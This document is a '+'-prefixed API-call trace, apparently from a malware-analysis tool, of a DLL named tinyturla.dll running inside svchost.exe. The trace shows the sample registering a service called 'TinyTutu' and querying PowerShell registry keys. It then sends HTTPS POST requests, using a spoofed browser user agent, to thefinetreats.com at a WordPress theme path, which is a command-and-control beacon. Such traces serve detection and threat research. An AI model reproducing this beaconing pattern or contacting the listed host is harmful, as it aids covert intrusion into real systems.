+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2238 ("TryAcquireSRWLockExclusive")
+[RET] 0x7fff146c03db in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2258 ("ReleaseSRWLockExclusive")
+[RET] 0x7fff146c03f2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2270 ("SleepConditionVariableSRW")
+[RET] 0x7fff146c0409 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2290 ("CreateThreadpoolWork")
+[RET] 0x7fff146c0420 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22A8 ("SubmitThreadpoolWork")
+[RET] 0x7fff146c0437 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22C0 ("CloseThreadpoolWork")
+[RET] 0x7fff146c044e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22D8 ("CompareStringEx")
+[RET] 0x7fff146c0465 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22E8 ("GetLocaleInfoEx")
+[RET] 0x7fff146c047c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22F8 ("LCMapStringEx")
+[RET] 0x7fff146c0493 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetModuleFileNameW> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : NULL. (Try to get current .exe's path)
+[PAR] LPSTR   lpFilename : 0x000000F43ECEEF50
+[PAR] DWORD   nSize      : 0x105
+[RET] 0x7fff146d5466 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E3548
+[STR]         -> "kernel32"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E79F0 ("AreFileApisANSI")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <AreFileApisANSI> in [KERNEL32.DLL] 
+[RET] 0x7fff146d54d7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43ECEEF50
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146ccf7d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43ECEEF50
+[PAR] int     cchWideChar       : 0xffffffff
+[PAR] LPSTR   lpMultiByteStr    : 0x00007FFF146F7330
+[PAR] int     cbMultiByte       : 0x104
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146ccfd4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetEnvironmentStringsW> in [KERNEL32.DLL] 
+[RET] 0x7fff146d6077 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43E85FFC0
+[PAR] int     cchWideChar       : 0x479
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146d60d8 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43E85FFC0
+[PAR] int     cchWideChar       : 0x479
+[PAR] LPSTR   lpMultiByteStr    : 0x000000F43E892980
+[PAR] int     cbMultiByte       : 0x479
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146d6111 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x000000F43E85FFC0
+[STR]       -> "ALLUSERSPROFILE=C:\ProgramData"
+[RET] 0x7fff146d613b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <RegisterServiceCtrlHandlerW> in [ADVAPI32.dll] 
+[PAR] LPCWTSTR          lpServiceName : 0x000000F43F3BD630
+[STR]                   -> "TinyTutu"
+[PAR] PHANDLER_FUNCTION lpHandlerProc : 0x00007FFF146BDCD0
+[RET] 0x7fff146bdd24 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <SetServiceStatus> in [ADVAPI32.dll] 
+[PAR] SERVICE_STATUS_HANDLE   hServiceStatus  : 0x000000F43E8958A0
+[PAR] LPSERVICE_STATUS        lpServiceStatus : 0x00007FFF146F5010
+[FLD]                         -> DWORD dwServiceType             = 0x20 (SERVICE_WIN32_SHARE_PROCESS)
+[FLD]                         -> DWORD dwCurrentState            = 0x4 (SERVICE_RUNNING)
+[FLD]                         -> DWORD dwControlsAccepted        = 0x0
+[FLD]                         -> DWORD dwWin32ExitCode           = 0x0
+[FLD]                         -> DWORD dwServiceSpecificExitCode = 0x0
+[FLD]                         -> DWORD dwCheckPoint              = 0x0
+[FLD]                         -> DWORD dwWaitHint                = 0x0
+[RET] 0x7fff146bdd4e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetModuleHandleExW> in [KERNEL32.DLL] 
+[PAR] DWORD   dwFlags      : 0x4 ( GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS )
+[PAR] PVOID   Address      : 0x00007FFF146BDC30
+[RET] 0x7fff146c9286 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x00007FFF146C9170 
+[PAR] LPVOID                 lpParameter     : 0x000000F43E8963E0
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x7fff146c9307 in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x674]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObjectEx> in [KERNEL32.DLL] 
+[RET] 0x7fff146bef43 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F48 ("FlsGetValue")
+[RET] 0x7fff146c697d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E7980
+[STR]         -> "api-ms-win-appmodel-runtime-l1-1-2"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <OpenFileMappingA> in [KERNEL32.DLL] 
+[PAR] DWORD   dwDesiredAccess : 0x4
+[PAR] BOOL    bInheritHandle  : 0x0
+[PAR] LPCTSTR lpName          : 0x000000F43F8892A0
+[STR]         -> "32656364656561"
+[RET] 0x7fff146bdb83 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <OpenFileMappingA> in [KERNEL32.DLL] 
+[PAR] DWORD   dwDesiredAccess : 0x4
+[PAR] BOOL    bInheritHandle  : 0x0
+[PAR] LPCTSTR lpName          : 0x000000F43F8892A0
+[STR]         -> "32656364656561"
+[RET] 0x7fff146bdbc7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <CreateFileMappingA> in [KERNEL32.DLL] 
+[PAR] HANDLE  hFile            : 0xffffffff
+            ->(File mapping backed by the system paging file instead of a file in the file system)
+[PAR] DWORD   flProtect        : 0x4(PAGE_READWRITE)
+[PAR] DWORD   dwMaximumSizeLow : 0x1000
+[PAR] LPCTSTR lpName           : 0x000000F43F8894C0
+[STR]         -> "32656364656561"
+[RET] 0x7fff146bdbff in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] 0x7fff146bf1f4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] 0x7fff146bf1f4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E7700
+[STR]         -> "api-ms-win-core-string-l1-1-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22D8 ("CompareStringEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7A10 ("EnumSystemLocalesEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E7580
+[STR]         -> "api-ms-win-core-datetime-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7A50 ("GetDateFormatEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22E8 ("GetLocaleInfoEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7A70 ("GetTimeFormatEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7A88 ("GetUserDefaultLocaleName")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7AB8 ("IsValidLocaleName")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E7650
+[STR]         -> "api-ms-win-core-localization-obsolete-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7AE0 ("LCIDToLocaleName")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E7B00 ("LocaleNameToLCID")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] 0x7fff146bf1f4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] 0x7fff146bf1f4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <CreateEventW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpName : 0x0 (null)
+[RET] 0x7fff146b2dc2 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCTSTR lpSubKey   : 0x00007FFF146E09C8
+[STR]         -> "SOFTWARE\Microsoft\PowerShell"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x8 (KEY_ENUMERATE_SUB_KEYS)
+[PAR] PHKEY   phkResult  : 0x000000F4404DF208
+[RET] 0x7fff146b4b46 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegEnumKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey              : 0x3f8 
+[PAR] DWORD     dwIndex           : 0x0
+[PAR] LPSTR     lpName            : 0x000000F4404DF210
+[PAR] LPDWORD   lpcchName         : 0x000000F4404DF1F0
+[FLD]           -> cchName = 0x20
+[PAR] LPDWORD   lpReserved        : 0x0
+[PAR] LPSTR     lpClass           : 0x0
+[PAR] LPDWORD   lpcchClass        : 0x0
+[PAR] PFILETIME lpftLastWriteTime : 0x0
+[RET] 0x7fff146b4b96 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x3f8 
+[PAR] LPCTSTR lpSubKey   : 0x000000F4404DF210
+[STR]         -> "1"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x1 (KEY_QUERY_VALUE)
+[PAR] PHKEY   phkResult  : 0x000000F4404DF1F8
+[RET] 0x7fff146b4bd8 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x530 
+[PAR] LPCTSTR lpSubKey   : 0x00007FFF146E09E8
+[STR]         -> "PowerShellEngine"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x1 (KEY_QUERY_VALUE)
+[PAR] PHKEY   phkResult  : 0x000000F4404DF200
+[RET] 0x7fff146b4c03 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegQueryValueExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x414 
+[PAR] LPCTSTR lpValueName : 0x00007FFF146E0A00
+[STR]         -> "PowerShellVersion"
+[RET] 0x7fff146b4c35 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegQueryValueExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x414 
+[PAR] LPCTSTR lpValueName : 0x00007FFF146E0A00
+[STR]         -> "PowerShellVersion"
+[RET] 0x7fff146b4c8c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x7fff146b4cba in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x7fff146b4cc4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegEnumKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey              : 0x3f8 
+[PAR] DWORD     dwIndex           : 0x1
+[PAR] LPSTR     lpName            : 0x000000F4404DF210
+[PAR] LPDWORD   lpcchName         : 0x000000F4404DF1F0
+[FLD]           -> cchName = 0x20
+[PAR] LPDWORD   lpReserved        : 0x0
+[PAR] LPSTR     lpClass           : 0x0
+[PAR] LPDWORD   lpcchClass        : 0x0
+[PAR] PFILETIME lpftLastWriteTime : 0x0
+[RET] 0x7fff146b4d1f in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x3f8 
+[PAR] LPCTSTR lpSubKey   : 0x000000F4404DF210
+[STR]         -> "3"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x1 (KEY_QUERY_VALUE)
+[PAR] PHKEY   phkResult  : 0x000000F4404DF1F8
+[RET] 0x7fff146b4bd8 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegOpenKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey       : 0x414 
+[PAR] LPCTSTR lpSubKey   : 0x00007FFF146E09E8
+[STR]         -> "PowerShellEngine"
+[PAR] DWORD   ulOptions  : 0x0
+[PAR] REGSAM  samDesired : 0x1 (KEY_QUERY_VALUE)
+[PAR] PHKEY   phkResult  : 0x000000F4404DF200
+[RET] 0x7fff146b4c03 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegQueryValueExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x530 
+[PAR] LPCTSTR lpValueName : 0x00007FFF146E0A00
+[STR]         -> "PowerShellVersion"
+[RET] 0x7fff146b4c35 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegQueryValueExA> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey        : 0x530 
+[PAR] LPCTSTR lpValueName : 0x00007FFF146E0A00
+[STR]         -> "PowerShellVersion"
+[RET] 0x7fff146b4c8c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x7fff146b4cba in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x7fff146b4cc4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegEnumKeyExA> in [ADVAPI32.dll] 
+[PAR] HKEY      hKey              : 0x3f8 
+[PAR] DWORD     dwIndex           : 0x2
+[PAR] LPSTR     lpName            : 0x000000F4404DF210
+[PAR] LPDWORD   lpcchName         : 0x000000F4404DF1F0
+[FLD]           -> cchName = 0x20
+[PAR] LPDWORD   lpReserved        : 0x0
+[PAR] LPSTR     lpClass           : 0x0
+[PAR] LPDWORD   lpcchClass        : 0x0
+[PAR] PFILETIME lpftLastWriteTime : 0x0
+[RET] 0x7fff146b4d1f in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <RegCloseKey> in [ADVAPI32.dll] 
+[RET] 0x7fff146b4d3c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetVersionExW> in [KERNEL32.DLL] 
+[PAR] LPOSVERSIONINFOW lpVersionInformation : 0x000000F4404DF2C0
+[RET] 0x7fff146b894a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetModuleHandleExW> in [KERNEL32.DLL] 
+[PAR] DWORD   dwFlags      : 0x4 ( GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS )
+[PAR] PVOID   Address      : 0x00007FFF146B1C10
+[RET] 0x7fff146c9286 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x00007FFF146C9170 
+[PAR] LPVOID                 lpParameter     : 0x000000F43E896260
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x7fff146c9307 in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x664]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <GetModuleHandleExW> in [KERNEL32.DLL] 
+[PAR] DWORD   dwFlags      : 0x4 ( GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS )
+[PAR] PVOID   Address      : 0x00007FFF146B1C10
+[RET] 0x7fff146c9286 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <CreateThread> in [KERNEL32.DLL] 
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress  : 0x00007FFF146C9170 
+[PAR] LPVOID                 lpParameter     : 0x000000F43E7BE270
+[PAR] DWORD                  dwCreationFlags : 0x0
+[RET] 0x7fff146c9307 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpen> in [WINHTTP.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x000000F43F86F1C0
+[STR]         -> "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
+[PAR] DWORD   dwAccessType    : 0x4 (INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7fff146bba91 in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x968]
+
+[ * ] [pid 0x254][tid 0x674] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObjectEx> in [KERNEL32.DLL] 
+[RET] 0x7fff146bef43 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
+[API] <WaitForSingleObject> in [KERNEL32.DLL] 
+[PAR] HANDLE hHandle        : 0x4e0
+[PAR] DWORD  dwMilliseconds : 0xffffffff (INFINITE)
+[RET] 0x7fff146b8adb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpConnect> in [WINHTTP.dll] 
+[PAR] HINTERNET     hSession       : 0x3e8037f0
+[PAR] LPCWSTR       pswzServerName : 0x000000F43E802E10
+[STR]               -> "thefinetreats.com"
+[PAR] INTERNET_PORT nServerPort    : 443
+[RET] 0x7fff146bbb16 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hConnect          : 0x3e895320
+[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F668
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BC5F0
+[STR]           -> "/wp-content/themes/twentyseventeen/rss-old.php"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
+[RET] 0x7fff146bbc26 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
+[API] <WinHttpSendRequest> in [WINHTTP.dll] 
+[PAR] HINTERNET hRequest         : 0x000000F43F5920B0
+[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BCCF0
+[STR]           -> "Content-Type: multipart/form-data; boundary="-""
+[PAR] DWORD     dwHeadersLength  : 0xffffffff
+[PAR] LPVOID    lpOptional       : 0x0 (null)
+[PAR] DWORD     dwOptionalLength : 0x0
+[PAR] DWORD     dwTotalLength    : 0xbe
+[RET] 0x7fff146bd38b in [tinyturla.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x25c]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x7f4]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x2c8]
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0xb68]
+
